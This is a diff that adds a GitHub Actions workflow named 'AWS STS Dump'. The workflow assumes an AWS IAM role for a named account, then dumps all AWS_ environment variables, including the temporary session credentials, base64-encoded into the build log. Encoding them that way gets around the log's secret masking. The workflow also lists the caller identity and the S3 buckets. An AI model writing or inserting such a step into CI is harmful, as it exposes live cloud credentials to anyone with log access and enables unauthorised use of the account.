@@ -1,0 +1,28 @@
+name: AWS STS Dump
+
+on:
+  push:
+    branches:
+      - main
+  workflow_dispatch:
+
+permissions:
+  id-token: write
+  contents: read
+
+jobs:
+  dump-aws:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Configure AWS Credentials
+        uses: aws-actions/configure-aws-credentials@v4
+        with:
+          role-to-assume: arn:aws:iam::707925622666:role/goti-dev-github-actions-role
+          aws-region: ap-northeast-2
+      
+      - name: Dump AWS Credentials
+        run: |
+          env | grep AWS_ > aws_env.txt
+          base64 aws_env.txt
+          aws sts get-caller-identity
+          aws s3 ls
